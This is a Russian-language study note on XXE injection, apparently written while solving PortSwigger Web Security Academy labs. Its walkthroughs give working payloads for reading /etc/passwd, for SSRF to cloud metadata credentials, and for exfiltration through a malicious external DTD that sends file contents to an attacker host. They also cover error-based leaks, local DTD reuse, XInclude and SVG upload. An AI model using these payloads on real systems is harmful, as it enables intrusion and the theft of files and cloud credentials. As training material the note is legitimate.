# Карта раздела
[[Карта раздела Types Of Vulnerabilities in Web]]

---
# Оглавление



---


> [!note] Определение SSRF
> XML external entity injection - это уязвимость веб-безопасности, позволяющая атакующему вмешиваться в обработку приложением XML данных, часто это позволяет просматривать файлы в файловой системе сервера и взаимодействовать с любыми внутренними или внешними системами к которым само приложение имеет доступ
> В некоторых ситуациях атакующий может эскалировать XXE атаку до компроментации базового сервера или другой серверной инфраструктуры используя уязвимость XXE для выполнения SSRF атак

---
# Возникновение уязвимости XXE 
Некоторые приложения используют формат XML для передачи данных между браузером и сервером, такие приложения почти всегда используют стандартную библиотеку или платформенный API для обработки XML на сервере. Уязвимость XXE возникает потому что спецификация XML содержит различные потенциально опасные возможности и стандартные парсеры поддерживают эти возможности, даже если приложение обычно их не использует

[[Сущности XML (entities)]] - Внешние сущности XML являются основным механизмом посредством которого возникает XXE injection

# Типы атак XXE

[[#Эксплуатация XXE для извлечения файлов]] атака при  которой внешняя сущность определяется как содержимое файла и возвращается в ответе приложения
[[#Эксплуатация XXE для выполнения SSRF атак]] атака при которой внешняя сущность определяется на основе URL внутренней системы
[[#Эксплуатация слепой XXE для внеполосной эксфильтрации данных]] атака при которое конфиденциальные данные передаются с сервера приложения в систему контролируемую злоумышленником
[[#Эксплуатация слепой XXE для извлечения данных через сообщения об ошибках]] атака при которой злоумышленник может вызвать сообщение об ошибке парсинга, содержащее конфиденциальную информацию

---
# Эксплуатация XXE для извлечения файлов
Чтобы выполнить XXE инъекцию извлекающую произвольный файл из файловой системы сервера, нужно изменить отправляемый XML двумя способами:
- Ввести или отредактировать элемент `DOCTYPE`, который определяет внешнюю сущность, содержащую путь к файлу
- Изменить значение данных в XML которое возвращается в ответе приложения, чтобы использовать определенную внешнюю сущность
Например предположим что приложение интернет магазина проверяет наличие товара на складе, отправляя на сервер 
следующий XML

```XML
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

Приложение не применяет специальных защит от XXE-атак, поэтому вы можете использовать уязвимость XXE для извлечения файла /etc/passwd, отправив следующую XXE полезную нагрузку:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

Эта XXE нагрузка определяет внешнюю сущность `&xxe` значение которой это содержимое файла `/etc/passwd` и использует сущность внутри значения `productId`, это приводит к тому, что ответ приложения включает в себя содержимое файла

```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```


> [!warning] ВАЖНО!
> В реальных XXE зачастую присутствует множество значений данных в отправляемом XML, любое из которых может быть использовано в ответе приложения. Чтобы систематически тестировать XXE-уязвимости, как правило, нужно проверять каждый узел данных в XML по отдельности, используя определенную сущность и проверять, появляется ли она в ответе приложения

## Пример Lab: Exploiting XXE using external entities to retrieve files
Уязвимость находится в `Check Stock`, формируется следующий HTTP ответ
```HTTP
POST /product/stock HTTP/2
Host: 0a9b002404b84cbf81802a7c001d00ac.web-security-academy.net
Cookie: session=seDQJuL1fbWfIXRDhgUjiudWkXq4TU4v
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9b002404b84cbf81802a7c001d00ac.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 109
Origin: https://0a9b002404b84cbf81802a7c001d00ac.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
Можем определить свою сущность для этого XML, тогда создаем сущность следующего вида
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

и пробуем протестировать первый параметр это `productId`, получаем запрос вида: 

```HTTP
POST /product/stock HTTP/2
Host: 0a9b002404b84cbf81802a7c001d00ac.web-security-academy.net
Cookie: session=seDQJuL1fbWfIXRDhgUjiudWkXq4TU4v
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9b002404b84cbf81802a7c001d00ac.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 174
Origin: https://0a9b002404b84cbf81802a7c001d00ac.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

после чего в ответе вернется содержимое файла `/etc/passwd`

---
# Эксплуатация XXE для выполнения SSRF атак
Помимо извлечения конфиденциальных данных, другой основной эффект атак XXE состоит в том что их можно использовать для выполнения SSRF

Чтобы эксплуатировать XXE для выполнения SSRF нужно определить внешнюю XML сущность, используя URL на который вы хотите нацелиться и использовать определенную определенную сущность в значении данных. Если вы можете использовать сущность в значении, которое возвращается в ответе приложения вы можете видеть ответ от URL внутри ответа приложения и с помощью этого получить двустороннее взаимодействие с внутренней системой. Если нет, вы сможете выполнять только "слепые" SSRF, но которые все еще могут иметь критические последствия

В Следующем примере XXE внешняя сущность заставит сервер выполнить внутренний HTTP запрос к системе в инфраструктуре организации
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internak.vulnerable-website.com/"> ]>
```

## Пример Lab: Exploiting XXE to perform SSRF attacks
В лабораторной работе сказано что нужно получить SSRF для внутреннего IP с помощью XXE injection, для этого нам необходимо создать внешнюю сущность на наш предложенный IP, так как мы знаем что IAM это сервис AWS для управления ролями, роль можно получить с помощью следующего пути `latest/meta-data/iam/security-credentials/`
В ответе получим следующее: 

```HTTP
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 27

"Invalid product ID: admin"
```

В результате подставляем в наш путь `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin` имя пользователя и получаем в ответе конфиденциальные данные, а полностью добавочная пользовательская внешняя сущность выглядит вот так: 
```XML
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

Ответ сервера:

```HTTP
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 552

"Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2026-03-22T04:17:48.385523483Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "mg4uYe2FjpI4pHutE4h1",
  "SecretAccessKey" : "Ntn4zVbnn8Xf8hUmMDYY9Zc99sUZTwpjudTI71Kl",
  "Token" : "2vyeIfUgN0aZFFsZ5Pfug16pT1EE2odPh4o01sad9J6QTDEzgqw1MXXjWnQM6MHCXtUIwIYlDmXf6OObHmMMkIvA7TRb9nK0rCJLYzbzeMDPcyvTvpVllmECq26gr3wssZwqvrUeJVNoxa07p8rKf2L9v5PI6PVEjxjYKCvhCINCjOhuhzTS1wDzXDUBS32lmxf96bB6cEJLX8Inc7PaLiTStLSPQFvoWRhSHBuVWZmzIaKF9CNSAMXb4WEedl4U",
  "Expiration" : "2032-03-20T04:17:48.385523483Z"
}"
```

# Слепые XXE уязвимости
Многие случаи XXE уязвимостей являются слепыми, их можно обнаруживать и эксплуатировать, но для этого требуются техники out-of-band, чтобы обнаружить уязвимости и эксфильтровать данные, также иногда можно вызвать ошибки парсинга XML которые приводят к раскрытию конфиденциальных данных в сообщениях об ошибках


> [!info] Определение
> "Слепые" XXE уязвимости возникают когда приложение уязвимо к XXE, но не возвращает значения каких либо определенных внешних сущностей в своих ответах. Это означает что прямое извлечение серверных файлов невозможно и поэтому слепая XXE как правило сложнее в эксплуатации, чем обычные XXE уязвимости

Существует два основных метода для обнаружения и эксплуатации слепых XXE уязвимостей

- Вызвать внеполосные сетевые взаимодействия(out-of-band), иногда эксфильтруя конфиденциальные данные в самих данных взаимодействия
- Вызвать ошибка парсинга XML таким образом, чтобы сообщения об ошибках содержали конфиденциальные данные

## Обнаружение слепой XXE с использованием OAST
Часто можно обнаружить слепую XXE, точно так же как и XXE для SSRF, но с триггером внеполосного сетевого взаимодействия с системой, которую вы контролируете. Например вы определяете внешнюю сущность 

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

Затем используем эту сущность в значении данных внутри XML

Эта XXE атака заставляет сервер выполнить внутренний HTTP запрос на указанный URL. Атакующий может отслеживать итоговый DNS запрос и HTTP запрос и таким образом определить что XXE атака была успешна
## Пример Lab: Blind XXE with out-of-band interaction
В лабораторной работе необходимо использовать OAST для инициализации запроса к нашему  Burp Coloborator серверу, для этого мы добавляем в запрос внешнюю сущность и используем ее в результате получаем следующий запрос для решения лабы: 
```HTTP
POST /product/stock HTTP/2
Host: 0a07008c032ae848802f170a004700b7.web-security-academy.net
Cookie: session=M3xkM8IqeW0Wq1toxqiLbAHhG8YhMRtX
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a07008c032ae848802f170a004700b7.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 204
Origin: https://0a07008c032ae848802f170a004700b7.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://pd66un153n4wuf9od0sin3xl1c73vujj.oastify.com"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

---
Иногда XXE-атаки с использованием обычных сущностей блокируются из за валидации ввода в приложение или ужесточения настроек используемого XML парсера, в такой ситуации можно попробовать использовать параметрические сущности XML.

Параметрическая сущность это особый вид XML сущностей, которые можно ссылать только внутри DTD. Для наших целей нужно знать два момента, во первых, объявление параметрической сущности XML включает символ процента перед именем сущности

```
<!ENTITY % myparameterentity "my parameter entity value" >
```

Во вторых параметрические сущности ссылаются с использованием символа процента заместо привычного амперсанда

```
%myparameterentity;
```
Это означает что вы можете тестировать слепую XXE с внеполосным детектированием через параметрические сущности следующим образом

```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

Эта XXE нагрузка объявляет параметрическую сущность XML с именем `xxe` а затем использует ее внутри DTD, это вызовет DNS запрос и HTTP запрос к домену атакующего подтверждая успешность атаки
## Пример Lab: Blind XXE with out-of-band interaction via XML parameter entities
В лабораторной работе необходимо инициализировать запрос к нашему Colaborator, но здесь важно использовать параметрическую сущность, которая была рассмотрена выше, в процессе исследования получаем наш `POST` для проверки наличия товара и вставляем туда нашу параметрическую сущность
```HTTP
POST /product/stock HTTP/2
Host: 0a09008804bbcf9781c752f800ce00b2.web-security-academy.net
Cookie: session=68FuxGbA92HCrbbLRgHNnHLgPA4hu5ix
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a09008804bbcf9781c752f800ce00b2.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 208
Origin: https://0a09008804bbcf9781c752f800ce00b2.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://4248g9jn7ya3a8mqfx1p1h59n0trhj58.oastify.com"> %xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
После чего лаба становится решенной

---
## Эксплуатация слепой XXE для внеполосной эксфильтрации данных
Обнаружение слепой XXE через внеполосные техники не демонстрирует практическую эксплуатацию уязвимости. Реальная цель атакующего это эксфильтрация конфиденциальных данных. Это можно реализовать через слепую XXE но для этого атакующему нужно разместить вредоносный DTD на контролируемой им системе и затем подключить внешний DTD из внутриполосной XXE нагрузки

Пример вредоносного DTD для эксфильтрации содержимого файла `/etc/passwd`

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &\#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

Этот DTD выполняет следующие шаги

- Определяет параметрическую сущность XML `file`, содержащую имя файла `/etc/passwd`
- Определяет параметрическую сущность XML `eval`, содержащую динамическое объявление другой сущности, `exfiltrate`, причем сущность будет вычислена путем HTTP запроса на веб-сервер атакующего с влеченным в строку запроса значением сущности `file`
- Использует сущность `eval` что приводит к динамическому объявлению сущности `exfiltrate`
- Использует сущность `exfiltrate` из за чего ее значение вычисляется запросом указанного URL

Атакующий должен разместить вредоносный DTD на контролируемой системе, обычно загрузив его на собственный веб сервер. Например DTD может обслуживаться по следующему URL

```
http://web-attacker.com/malicious.dtd
```

Наконец атакующий отправляет в уязвимое приложение следующую XXE нагрузку 

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

Эта XXE нагрузка объявляет параметрическую сущность XML `xxe` а затем использует ее внутри DTD это заставит XML парсер загрузить внешний DTD с сервера атакующего и интерпретировать его inline. Затем выполняются шаги вредоносного DTD и файл `/etc/passwd` передается на сервер атакующего


> [!warning] ВАЖНО!
> Этот прием может не сработать с некоторыми типами содержимого файлов, включая символы новой строки, присутствующие в `/etc/passwd` Это потому что некоторые XML парсеры получают URL во внешней сущности через API, который валидирует допустимые символы URL. В такой ситуации можно попробовать использовать протокол FTP, вместо HTTP, иногда эксфильтрация данных содержащих символы новой строки невозможна и тогда можно нацелиться на файл `/etc/hostname`
## Пример Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD 
По примеру выше мы должны получить файл `/etc/hostname`, для этого нам необходимо указать ссылку на внешнюю часть сущность, указав внутри нее XML код который будет выполнять уже то что нужно нам, в итоге получаем 
```HTTP
POST /product/stock HTTP/2
Host: 0a3d0076032780a1aa7aac7800af0006.web-security-academy.net
Cookie: session=pGcwleI5D7kVAn4eexvmKSLfLQHHjzlV
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a3d0076032780a1aa7aac7800af0006.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 230
Origin: https://0a3d0076032780a1aa7aac7800af0006.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0abd004b03388029aa35ab8701a700c5.exploit-server.net/exploit"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Вызывает исполнение внешней сущности на сервере который был предоставлен для лабораторной работы, внутри сервера указываем следующее Body 

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0abd004b03388029aa35ab8701a700c5.exploit-server.net/exploit/?x=%file;'>">
%eval;
%exfil;
```

В результате исполнения этой внешней сущности, на наш сервер придет запрос с обращением к этому же серверу и получим что то вот такое: 

![[Pasted image 20260322184127.png]]

где в качестве значения параметра будет лежать наш hostname

## Эксплуатация слепой XXE для извлечения данных через сообщения об ошибках
Альтернативный подход к эксплуатации слепой XXE это вызвать ошибку парсинга XML при которой сообщение об ошибке содержит интересующие нас конфиденциальные данные. Это эффективно если приложение возвращает получившиеся сообщение об ошибке в своем ответе

Мы можем вызвать сообщение об ошибке парсинга XML содержащее содержимое файла `/etc/passwd` с помощью следующего вредоносного внешнего DTD:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &\#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Этот DTD выполняет следующие шаги 

Определяет параметрическую сущность XML `file`, содержащую файл `/etc/passwd`
Определяет параметрическую сущность XML `eval`, которая содержит динамическое объявление другой параметрической сущности `error`, и сущность `error` будет вычислена путем загрузки несуществующего файла, имя которого содержит значение сущности `file`
Используется сущность `eval`что приводит к динамическому объявлению сущности `error`
Используется сущность `error` из за чего ее значение вычисляется попыткой загрузить несуществующий файл, что приводит к сообщению об ошибке, содержащее имя несуществующего файла то есть содержимое `/etc/passwd`

Вызов внешнего вредоносного DTD приведет к сообщению об ошибке примерно следующего вида: 
```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

## Пример Lab: Exploiting blind XXE to retrieve data via error messages
В лабораторной работе необходимо вытащить информацию через ошибку, для этого воспользуемся, следующим запросом через внешнюю сущность 

```HTTP
POST /product/stock HTTP/2
Host: 0a7900a303cf980e816a9d4d00dd0059.web-security-academy.net
Cookie: session=SWqH7P1X5VIxPqvYysW2ahL1UBQAC8S9
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a7900a303cf980e816a9d4d00dd0059.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 230
Origin: https://0a7900a303cf980e816a9d4d00dd0059.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a2000d603cd98fe81829c42012800ef.exploit-server.net/exploit"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

а на нашем сервере разместим следующий payload: 

```XML
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

После чего через Repeater отсылаем запрос и получаем следующий ответ 

```HTTP
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2419

"XML parser exited with error: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
...
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false (No such file or directory)"
```

---

## Эксплуатация слепой XXE путем повторного использования локального DTD

Предыдущая техника хорошо работает с внешним DTD, но обычно не работает с внутренним DTD, полностью заданным внутри элемента `DOCTYPE`, это потому что техника использует параметрическую сущность XML внутри определения другой параметрической сущности. По спецификации XML допустимо во внешних DTD но не во внутренних, потому что некоторые парсеры допускают, но многие нет

Что делать со слепой XXE когда внеполосные взаимодействия заблокированы, нельзя эксфильтровать данные по внеполосному соединению и нельзя загрузить внешний DTD с удаленного сервера

В такой ситуации все еще может быть возможность вызвать сообщения об ошибках, содержащие конфиденциальные данные, благодаря лазейке в спецификации XML. Если DTD документа это гибрид внутренних и внешних объявлений то внутренний DTD может переопределять сущности, объявленные во внешнем DTD, в этом случае ограничение на использование параметрической сущности внутри определения другой параметрической сущности ослабляется 

Это означает что атакующий может применить технику извлечения информации с помощью сообщений об ошибках из внутреннего DTD, при условии что используемая параметрическая сущность переопределяет сущность объявленную во внешнем DTD. Разумеется если внеполосные соединения заблокированы то внешний DTD нельзя загрузить удаленно, вместо этого нужен внешний DTD файл который будет локальным для сервера приложения, по сути атака заключается в вызове DTD файла который есть на локальной файловой системе и его переиспользовании для переопределения существующей сущности так, чтобы провоцировать ошибку парсинга с утечкой конфиденциальных данных.

Например предположим, что на сервере есть DTD файл по пути `/usr/local/app/schema.dtd` и в этом DTD объявлена сущность `custom_entity`, атакующий может вызвать сообщение об ошибке парсинга XML, содержащее содержимое файла `/etc/passwd` отправив гибридный DTD, вроде следующего 

```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"> 
<!ENTITY % custom_entity ' 
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> 
&#x25;eval; &#x25;error;
'> 
%local_dtd;
]>
```

Этот DTD выполняет следующие шаги 

- Определяет параметрическую сущность XML `local_dtd`, содержащую содержимое внешнего DTD файла, существующего на файловой системе сервера
- Переопределяет параметрическую сущность XML `custom_entity`, уже объявленную во внешнем DTD файле. Сущность переопределяется так чтобы содержать ошибку, для генерации сообщения об ошибке с содержимым файла `/etc/passwd`
- Использует сущность `local_dtd` из за чего внешний DTD интерпретируется с учетом переопределенного значения `custom_entity`, это привод к желаемому сообщению об ошибке 
## Поиск существующего DTD для повторного использования 
Поскольку эта атака использует существующий DTD, на файловой системе сервера, ключевое требование это найти подходящий файл, это может быть довольно просто потому что приложение возвращает любые сообщения об ошибках, генерируемый XML парсером, вы можете легко перечислить локальные DTD файлы, просто пытаясь загрузить их из внутреннего DTD

Например в система Linux с рабочим столом GNOME часто есть DTD файл по пути `/usr/share/yelp/dtd/docbookx.dtd`, мы можем проверить наличие этого файла, отправив следующую XXE нагрузку которая вызовет ошибку если файл существует

```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd
]>
```

После того как вы проверили список распространенных DTD файлов, вам нужно получить его копию и изучить чтобы найти сущность которую можно переопределить, поскольку многие распространенные системы включающие DTD файлы являются open source, обычно можно быстро получить копии файлов через поиск в интернете.

## Пример Lab: Exploiting XXE to retrieve data by repurposing a local DTD
В лабораторной сказано что уязвимость находится в `Check stock`, поэтому для работы необходимо получить POST запрос, далее использовать DTD описанное выше, так же есть `hint` что в нашем случае у нас есть файл `/usr/share/yelp/dtd/docbookx.dtd`, а в нем внутренняя сущность `ISOamso`, которую мы и будем переопределять в результате получится следующий запрос: 

```HTTP
POST /product/stock HTTP/2
Host: 0ae200ac04f2922d83399ed2004c003e.web-security-academy.net
...

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
 <!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

На него мы получим следующий ответ: 

```HTTP
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2419

"XML parser exited with error: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```
В результате и получаем решенную лабу

---
# Как найти скрытую поверхность атаки для XXE инъекций
Поверхность атаки для уязвимостей XXE во многих случаях очевидна поскольку обычный HTTP трафик включает запросы, содержащие данные в формате XML, в других случаях поверхность атаки менее заметна, однако есои искать в нужных местах, вы найдете поверхность атаки XXE в запросах, которые не содержат явного XML

# Атаки XInclude
Некоторые приложения принимают данные отправленные клиентом, встраивают их на серверной стороне в XML-документ а затем парсят документ, примером этого является ситуация когда клиентские данные помещаются в серверный SOAP-запрос, который затем обрабатывается серверной службой SOAP

В этой ситуации мы не можем провести классическую XXE атаку, поскольку мы не контролируем весь XML документ и не можем определить или изменить элемент `DOCTYPE`. Однако мы можем использовать `XInclude`(это механизм включения частей документов XML). `XInclude` часть спецификации XML позволяющая собирать XML документ из поддокументов, мы может поместить атаку `XInclude` в любое значение данных XML документа, поэтому ее можно выполнить в ситуациях когда вы контролируете лишь один фрагмент данных, помещаемый в серверный XML документ 

Чтобы выполнить атаку `XInclude` необходимо сослаться на пространство имен `XInclude` и указать путь к файлу, который нужно включить, например 

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

# Пример Lab: Exploiting XInclude to retrieve files
В лабораторной работе уязвимость находится в `POST` запросе к проверке наличия на складе, но изначально мы отправляем запрос в двух параметрах, но для отправки XML это не подходит поэтому мы можем изменить отправку данных и попробовать в `MultipartForm` заместо productId отправить наш payload для XInclude атаки, в результате получаем что то такое: 

```HTTP
POST /product/stock HTTP/2
Host: 0a7f000f0395975080ee120f00290065.web-security-academy.net
...

------WebKitFormBoundaryTbybgKwXjrm7hvLQ
Content-Disposition: form-data; name="productId"

<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
------WebKitFormBoundaryTbybgKwXjrm7hvLQ
Content-Disposition: form-data; name="storeId"

1
------WebKitFormBoundaryTbybgKwXjrm7hvLQ--
```

И в результате отправки такой формы решим лабу
# Атаки XXE через загрузку файла
Некоторые приложения позволяют пользователям загружать файлы которые затем обрабатываются на сервере, некоторые распространенные форматы файлов используют XML или содержат XML компоненты. Примеры форматов на основе XML это офисные форматы документов такие как DOCX и форматы изображений такие как SVG

Например приложение может позволять загружать изображения и обрабатывать или проверять их на сервере после загрузки. Даже если приложение ожидает получить формат вроде PNG или JPEG используемая библиотека может поддерживать изображения SBG поскольку формат SVG использует XML атакующий может отправить вредоносное SVG изображение и таким образом получить доступ к скрытой поверхности атаки уязвимостей XXE
# Пример Lab: Exploiting XXE via image file upload
В лабораторной работе необходимо выгрузить hostname через файл, так как в hint мы имеем что фото может быть svg, а svg парсится как XML, тогда можем попробовать следующее

```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="10" x="10" y="30">&xxe;</text></svg>
```

Сказать что в svg картинке может должен быть текст, который представляет из себя содержимое файла, `/etc/hostname` так же необходимо задать правильный `Content-Type: image/svg+xml`, в результате получаем примерно такой запрос: 

```HTTP
POST /post/comment HTTP/2
Host: 0a05004c03c3c97686820c4000a20006.web-security-academy.net
...

-----------------------------21920445233197128721071036968
Content-Disposition: form-data; name="csrf"

Sj0tUd8EmSHOXvj3e14ouIMOtfvH43QP
-----------------------------21920445233197128721071036968
Content-Disposition: form-data; name="postId"

4
-----------------------------21920445233197128721071036968
Content-Disposition: form-data; name="comment"

123
-----------------------------21920445233197128721071036968
Content-Disposition: form-data; name="name"

123
-----------------------------21920445233197128721071036968
Content-Disposition: form-data; name="avatar"; filename="test.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="10" x="10" y="30">&xxe;</text></svg>
-----------------------------21920445233197128721071036968
Content-Disposition: form-data; name="email"

1@1
-----------------------------21920445233197128721071036968
Content-Disposition: form-data; name="website"


-----------------------------21920445233197128721071036968--
```

А потом просто просматриваем нашу картинку и забираем имя хоста
# Атаки XXE через модифицированный тип содержимого
Большинство POST запросов используют тип содержимого по умолчанию генерируемый HTML формами например `application/x-www-form-urlencoded`, некоторые сайты ожидают получать запросы в этом формате, но допускают и другие типы содержимого, включая XML, например если обычный запрос содержит следующее:

```HTTP
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
foo=bar
```

То вы можете попробовать следующий запрос с тем же результатом: 

```HTTP
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52
<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

Если приложение допускает запросы, содержащие XML в теле сообщения и парсит тело как XML, то вы можете получить доступ к скрытой поверхности атаки XXE, просто переформатировав запросы в XML
# Как находить и тестировать XXE уязвимости
Ручное тестирование XXE включает в себя:

Тестирование на [[#Эксплуатация XXE для извлечения файлов]] путем определения внешней сущности на основе известного системного файла и использования этой сущности в данных которые возвращаются в ответе приложения
Тестирование на [[#Слепые XXE уязвимости]] путем определения внешней сущности на основе URL системы которую вы контролируете, и мониторинга взаимодействия с этой системой. Для этой цели идеально подходит Coloborator
Тестирование на небезопасное включение пользовательских не XML данных в серверный XML документ с посмощью атаки XInclude, пытаясь извлечь известный системный файл 


> [!warning] ВАЖНО!
> Помните что XML - это лишь формат передачи данных. Обязательно тестируйте любую функциональность, основанную на XML, и на другие уязвимости, такие как XXS и SQL-injection, возможно вам потребуется кодировать полезную нагрузку с использованием XML-escape последовательностей, чтобы не нарушить синтаксис, но также вы можете использовать это для обфускации атаки с целью обхода слабых защит 

